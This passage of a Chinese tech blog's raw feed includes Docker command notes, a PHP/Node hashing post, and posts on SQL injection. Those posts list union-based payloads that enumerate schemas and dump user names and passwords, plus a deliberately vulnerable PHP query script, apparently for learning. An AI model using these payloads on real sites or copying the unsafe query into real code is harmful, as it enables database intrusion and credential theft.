plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">hello-world         latest              fce289e99eb9        3 months ago        1.84kB</span><br><span class="line"></span><br><span class="line">各个选项说明:</span><br><span class="line">* REPOSITORY：表示镜像的仓库源</span><br><span class="line">* TAG：镜像的标签</span><br><span class="line">* IMAGE ID：镜像ID</span><br><span class="line">* CREATED：镜像创建时间</span><br><span class="line">* SIZE：镜像大小</span><br></pre></td></tr></table></figure><p>查找镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker search nginx </span><br><span class="line">NAME     DESCRIPTION                    STARS      OFFICIAL </span><br><span class="line">nginx    Official build of Nginx.       11154        [OK]</span><br><span class="line"></span><br><span class="line">NAME:镜像仓库源的名称</span><br><span class="line"></span><br><span class="line">DESCRIPTION:镜像的描述</span><br><span class="line"></span><br><span class="line">OFFICIAL:是否docker官方发布</span><br></pre></td></tr></table></figure><p>获取一个新镜像</p><p>如果我们决定使用上图中的 nginx 官方镜像，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull nginx</span><br></pre></td></tr></table></figure><h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><p>列出下载到计算机中的 container </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker container ls</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br></pre></td></tr></table></figure><h3 id="仓库操作"><a href="#仓库操作" class="headerlink" title="仓库操作"></a>仓库操作</h3><p>登入<code>hub.docker.com</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker login </span><br><span class="line"># 前提是先注册号账号</span><br></pre></td></tr></table></figure><p>标记镜像，以便上传至目标位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker tag mydocker aikang&#x2F;get-started:part1</span><br><span class="line"># 最后上传至所登入的Docker Hub仓库</span><br></pre></td></tr></table></figure><p>将标记的镜像上传到存储库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker push mydocker aikang&#x2F;get-started:part1</span><br></pre></td></tr></table></figure><p>从远程存储库中拉出并运行映像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d -p 4000:80 aikang&#x2F;get-started:part1</span><br></pre></td></tr></table></figure><p>注意：无论在哪里执行<code>docker run</code>，它都会提取你的镜像，以及Python和所有依赖项requirements.txt，并运行你的代码。它们都在一个整洁的小包中一起旅行，你不需要在主机上安装任何东西让Docker运行它。</p><h3 id="服务操作"><a href="#服务操作" class="headerlink" title="服务操作"></a>服务操作</h3><p>群集初始化，可以使节点变成群集管理器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init</span><br></pre></td></tr></table></figure><p>以服务运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br><span class="line">Creating network getstartedlab_webnet</span><br><span class="line">Creating service getstartedlab_web</span><br><span class="line"># 需要有一个docker-compose.yml 文件</span><br></pre></td></tr></table></figure><p>列出与应用程序关联的正在运行的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker service ls</span><br></pre></td></tr></table></figure><p>查看与堆栈相关的所有服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack services getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure><p>列出服务任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker service ps getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure><p>关闭服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack rm getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure><p>查看集群中的节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker node ls</span><br></pre></td></tr></table></figure><h3 id="VM-交互"><a href="#VM-交互" class="headerlink" title="VM 交互"></a>VM 交互</h3><p>创建一个VM 实例（Win、Mac、Linux）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine create --driver virtualbox myvm1</span><br></pre></td></tr></table></figure><p>使用ssh 连接VM 实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br></pre></td></tr></table></figure><p>查看关于节点的基本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine env myvm1</span><br></pre></td></tr></table></figure><p>使用scp命令将本地文件copy到VM实例中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine scp &lt;filename&gt; myvm1:~  </span><br><span class="line"># 从当前目录拷贝到实例中的根目录下</span><br></pre></td></tr></table></figure><p>删除指定VM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine rm myvm1</span><br></pre></td></tr></table></figure><p>将Shell 与VM 连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eval $(docker-machine env myvm1)</span><br></pre></td></tr></table></figure><p>将Shell 与VM 断开，使用本地连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eval $(docker-machine env -u)</span><br></pre></td></tr></table></figure><h3 id="集群操作"><a href="#集群操作" class="headerlink" title="集群操作"></a>集群操作</h3><p>以下操作均需要在VM CLI 中运行</p><p>初始化集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init --advertise-addr &lt;myvm1 ip&gt;</span><br></pre></td></tr></table></figure><p>将节点加入集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm join --token &lt;token&gt; &lt;ip&gt;:2377&quot;</span><br></pre></td></tr></table></figure><p>让工作者离开集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm leave</span><br></pre></td></tr></table></figure><p>强制离开并关掉集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm leave -f</span><br></pre></td></tr></table></figure><p>查看该节点的详情信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker node inspect &lt;node ID&gt;</span><br></pre></td></tr></table></figure><p>部署应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack deploy -c &lt;file&gt; &lt;app&gt;</span><br></pre></td></tr></table></figure><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><p>查看Docker版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker version</span><br></pre></td></tr></table></figure><p>显示Docker系统信息，包括镜像和容器数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker info</span><br></pre></td></tr></table></figure><p>查看Docker 容器的配置和状态信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker inspect mydocker</span><br><span class="line"># 表示容器的Container ID 或者Names</span><br></pre></td></tr></table></figure><p>查看指定容器映射到宿主机的端口号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker port mydocker</span><br><span class="line">80&#x2F;tcp -&gt; 0.0.0.0:4000</span><br><span class="line"># mydocker 表示该应用的Container ID 或者Names</span><br></pre></td></tr></table></figure><p>查看Web 应用程序日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs -f mydocker </span><br><span class="line"> * Running on http:&#x2F;&#x2F;0.0.0.0:80&#x2F; (Press CTRL+C to quit)</span><br><span class="line">113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:34] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line">113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:35] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line"># mydocker 表示该应用的Container ID 或者是Names</span><br></pre></td></tr></table></figure><p>查看Web 应用程序容器的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker top mydocker </span><br><span class="line"># </span><br><span class="line">UID        PID       PPID        C     STIME        TTY         TIME                CMD</span><br><span class="line">root      22358      22323       0     20:58        ?      00:00:00            python app.py</span><br></pre></td></tr></table></figure><h2 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h2><h3 id="容器有哪些网络模式"><a href="#容器有哪些网络模式" class="headerlink" title="容器有哪些网络模式"></a>容器有哪些网络模式</h3><h5 id="1-None"><a href="#1-None" class="headerlink" title="1. None"></a>1. None</h5><p>在该模式下容器没有对外网络，本地机只有一个回路地址</p><h5 id="2-Container"><a href="#2-Container" class="headerlink" title="2. Container"></a>2. Container</h5><p>在该模式下，与另一个容器共享网络</p><h5 id="3-Host"><a href="#3-Host" class="headerlink" title="3. Host"></a>3. Host</h5><p>在该模式下，与主机共享网络</p><h5 id="4-Bridge"><a href="#4-Bridge" class="headerlink" title="4. Bridge"></a>4. Bridge</h5><p>该模式为Docker 默认的网络模式，在这种模式下，Docker 容器与外部的通信都是通过 iptable 实现的。</p><h5 id="5-Overlay"><a href="#5-Overlay" class="headerlink" title="5. Overlay"></a>5. Overlay</h5><p>该模式为Docker 目前原生的跨主机多子网模型，主要是通过 vxlan 技术实现。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">Docker 入门教程 - 阮一峰网络日志</a></li><li><a href="wiki.jikexueyuan.com/project/docker-technology-and-combat">Docker 入门 - 极客学院</a></li><li><a href="https://docs.docker.com/install/" target="_blank" rel="noopener">安装Docker ce - 官方文档</a></li><li><a href="http://www.ityouknow.com/docker/2018/04/19/docker-swarm.html" target="_blank" rel="noopener">Docker Swarm 入门教程</a></li><li><a href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">如何在Ubuntu 18.4上安装 Docker-ce</a></li><li><a href="https://docs.docker.com/machine/install-machine/" target="_blank" rel="noopener">如何在Ubuntu 18.04上安装Docker Machine</a></li><li><a href="https://linuxize.com/post/how-to-install-virtualbox-on-ubuntu-18-04/#disqus_thread" target="_blank" rel="noopener">如何在Ubuntu 18.04上安装VirtualBox</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记的主要目的是用来记录学习 &lt;code&gt;Docker&lt;/code&gt; 的过程。&lt;code&gt;Docker&lt;/code&gt;这个词并不是第一次听说了，印象中好久以前就听说过这个东西了，只是一直没有真正去了解。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Linux/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Docker" scheme="https://www.0x2beace.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>PHP 中使用 hash_hmac 加密</title>
    <link href="https://www.0x2beace.com/php-uses-hash-hmac-encryption/"/>
    <id>https://www.0x2beace.com/php-uses-hash-hmac-encryption/</id>
    <published>2020-07-22T16:18:45.000Z</published>
    <updated>2020-11-12T01:26:42.165Z</updated>
    
    <content type="html"><![CDATA[<p>今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用<code>Node</code>写的，需要翻译成<code>PHP</code> 版本的。</p><a id="more"></a><h3 id="PHP中使用-Hmac-方法生成带有密钥的哈希值"><a href="#PHP中使用-Hmac-方法生成带有密钥的哈希值" class="headerlink" title="PHP中使用 Hmac 方法生成带有密钥的哈希值"></a>PHP中使用 Hmac 方法生成带有密钥的哈希值</h3><p>在Node.js 中，这是一段用于生成“加盐”的哈希值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var crypto &#x3D; require(&#39;crypto&#39;);</span><br><span class="line"></span><br><span class="line">var secret &#x3D; &quot;122410&quot;</span><br><span class="line">var key &#x3D; &quot;key&quot;</span><br><span class="line">var hash &#x3D; crypto.createHmac(&#39;sha256&#39;, secret).update(key).digest(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line">console.log(hash);</span><br><span class="line">&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4</span><br></pre></td></tr></table></figure><p>如果要翻译成PHP版本，其实非常简单，直接使用PHP 的 <code>hash_hmac</code>函数就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$secret &#x3D; &quot;122410&quot;; </span><br><span class="line">$key &#x3D; &quot;key&quot;;</span><br><span class="line">echo hash_hmac(&quot;sha256&quot;, $key, $secret);</span><br><span class="line">&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4</span><br></pre></td></tr></table></figure><h4 id="将密钥设置成二进制"><a href="#将密钥设置成二进制" class="headerlink" title="将密钥设置成二进制"></a>将密钥设置成二进制</h4><p>如果需要加密的部分，并不是普通的字符串，而是二进制字符串，那么需要使用<code>pack</code>函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 5e50e6458b0cdc7ee534967d113a9deffe6740d0</span><br><span class="line">&#x2F;&#x2F; 预期结果：46abe81345b1da2f1a330bba3d6254e110cd9ad8</span><br></pre></td></tr></table></figure><p>先将十六进制字符串转换为二进制数据，然后再将其传递给<code>hash_hmac</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, pack(&quot;H*&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;)));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 46abe81345b1da2f1a330bba3d6254e110cd9ad8</span><br></pre></td></tr></table></figure><h3 id="Node中使用crypto进行md5-加密"><a href="#Node中使用crypto进行md5-加密" class="headerlink" title="Node中使用crypto进行md5 加密"></a>Node中使用crypto进行md5 加密</h3><p>在PHP 中，如果需要获取某个字符串的md5 加密之后的哈希值，非常简单，直接使用<code>md5</code> 函数即可。</p><p>但是在<code>node.js</code> 中，并没有为我们直接提供这样的函数，所以需要手动调用<code>crypto</code> 模块去转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var pwd &#x3D; &quot;122410&quot;;</span><br><span class="line">var hash &#x3D; crypto.createHash(&#39;md5&#39;).update(pwd).digest(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 913975c2f972ba6bbf5ba593c68a5dc5</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://stackoverflow.com/questions/13012239/how-to-set-the-hmacsha1-key-to-hex-in-php" target="_blank" rel="noopener">如何在PHP中将hmac sha1密钥设置为十六进制？</a></li><li><a href="https://caligatio.github.io/jsSHA/" target="_blank" rel="noopener">在线转换工具</a></li><li><a href="https://www.php.net/manual/zh/function.hash-hmac.php" target="_blank" rel="noopener">php hash_hmac 函数</a></li><li><a href="http://nodejs.cn/api/crypto.html" target="_blank" rel="noopener">node.js crypto 模块</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用&lt;code&gt;Node&lt;/code&gt;写的，需要翻译成&lt;code&gt;PHP&lt;/code&gt; 版本的。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Node" scheme="https://www.0x2beace.com/tags/Node/"/>
    
    <category term="Hash" scheme="https://www.0x2beace.com/tags/Hash/"/>
    
  </entry>
  
  <entry>
    <title>整理常见的 SQL 注入语句</title>
    <link href="https://www.0x2beace.com/organize-common-sql-injection-statements/"/>
    <id>https://www.0x2beace.com/organize-common-sql-injection-statements/</id>
    <published>2020-07-22T15:30:04.000Z</published>
    <updated>2020-07-22T15:31:27.367Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记的目的是整理各种 SQL 注入使用时的<code>payload</code>。</p><a id="more"></a><blockquote><p>说明：以下的<code>payloads</code>都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。</p></blockquote><p>也就是基于这样一种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;;</span><br></pre></td></tr></table></figure><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><ol><li>判断当前数据表中有几列：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 数值 --+</span><br></pre></td></tr></table></figure><ol start="2"><li>查看显示位在第几列：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里需要传递一个不存在的条件，比如：<code>id=-1</code></p></blockquote><ol start="3"><li>显示当前数据库（假设显示位中包含第三位）：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure><ol start="4"><li>查看当前数据库中的所有表：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+</span><br></pre></td></tr></table></figure><blockquote><p>函数<code>group_concat()</code>把所有结果都在一行输出</p></blockquote><ol start="5"><li>查询所有数据库：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+</span><br></pre></td></tr></table></figure><ol start="6"><li>查询某个数据库中的表：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure><ol start="7"><li><p>查询某个表中的所有字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+</span><br></pre></td></tr></table></figure></li><li><p>查询某个表中的字段内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users)</span><br></pre></td></tr></table></figure><blockquote><p>0x3a会被转义位冒号<code>：</code></p></blockquote></li></ol><h3 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h3><p>SQL UNION 操作符合并两个或多个 SELECT 语句的结果，需要注意的是：UNION 内部的每个 SELECT 语句必须拥有相同数量的列。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://ca0y1h.top/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">Web安全学习之数据库注入语句的收集和学习</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记的目的是整理各种 SQL 注入使用时的&lt;code&gt;payload&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
    <category term="Web 安全" scheme="https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>认识SQL 注入常见方式</title>
    <link href="https://www.0x2beace.com/know-common-ways-of-sql-injection/"/>
    <id>https://www.0x2beace.com/know-common-ways-of-sql-injection/</id>
    <published>2020-07-22T15:26:11.000Z</published>
    <updated>2020-07-22T15:29:48.375Z</updated>
    
    <content type="html"><![CDATA[<p>最近需要做一个检测<code>SQL 注入</code>的功能，无奈发现自己于对<code>SQL 注入</code>竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。</p><a id="more"></a><h2 id="SQL-注入是什么？"><a href="#SQL-注入是什么？" class="headerlink" title="SQL 注入是什么？"></a>SQL 注入是什么？</h2><p>SQL 注入是一种将SQL 语句添加到REQUEST 参数中，传递到服务器并执行的一种攻击手段。</p><p>SQL 注入攻击是REQUEST 引數未经过过滤，然后直接拼接到SQL 语句中，解析并执行，而达到预想之外的一种行为。</p><h2 id="SQL-注入是怎样产生的"><a href="#SQL-注入是怎样产生的" class="headerlink" title="SQL 注入是怎样产生的"></a>SQL 注入是怎样产生的</h2><ol><li>WEB 开发人员无法保证所有的输入都已经完美过滤。</li><li>数据库未做安全配置，存在安全隐患。</li></ol><h2 id="如何进行SQL-注入"><a href="#如何进行SQL-注入" class="headerlink" title="如何进行SQL 注入"></a>如何进行SQL 注入</h2><p>这里以<code>PHP</code>、<code>Mysql</code>为例，介绍一下完整的SQL 注入攻击是如何产生的。</p><h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$db_host &#x3D; &quot;localhost&quot;;</span><br><span class="line">$db_user &#x3D; &quot;root&quot;;</span><br><span class="line">$db_pwd &#x3D; xxxxxx;</span><br><span class="line">$db_name &#x3D; &quot;User&quot;;</span><br><span class="line">$db_table &#x3D; &quot;Student&quot;;</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;h1&gt;&#39;;</span><br><span class="line">echo &#39;Test ErrorBased Injections&#39;;</span><br><span class="line">echo &#39;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">error_reporting(E_ALL ^ E_DEPRECATED);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 测试连接</span><br><span class="line">$conn &#x3D; mysqli_connect($db_host, $db_user, $db_pwd);</span><br><span class="line">if (!$conn)&#123;</span><br><span class="line">    echo &#39;Mysql 连接失败:&#39;.mysqli_error($conn);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo &#39;Mysql 连接成功&#39;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;连接数据库</span><br><span class="line">mysqli_select_db($conn, $db_name) or die (&quot;无法连接到数据库: &quot;.$db_name);</span><br><span class="line">mysqli_query($conn, &#39;set names utf-8&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取参数</span><br><span class="line">if(isset($_GET[&#39;id&#39;]))&#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 拼接SQL语句</span><br><span class="line">$sql&#x3D; &quot;SELECT * FROM $db_table WHERE id &#x3D; &#123;$id&#125; &quot;;</span><br><span class="line">echo &#39;查询SQL 语句:&#39;.$sql;</span><br><span class="line">echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;执行</span><br><span class="line">$result&#x3D;mysqli_query($conn, $sql);</span><br><span class="line">$row&#x3D;mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line">if($row) &#123;</span><br><span class="line">  echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];</span><br><span class="line">  echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">  echo &#39;Your Password:&#39;.$row[&#39;password&#39;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>调用地址是<code>http://127.0.0.1/sqli.php?id=1</code>，使用<code>GET</code>传入参数<code>id</code>，输出的SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;</span><br></pre></td></tr></table></figure><p>正常情况下，会返回<code>id = 1</code> 的学生信息。</p><h4 id="1-数字注入"><a href="#1-数字注入" class="headerlink" title="1. 数字注入"></a>1. 数字注入</h4><p>如果在浏览器中输入：<code>http://127.0.0./sqli.php?id=1&#39; union select 1,2--+</code>会怎样呢？输出的SQL 语句如下：</p><figure class="highlight 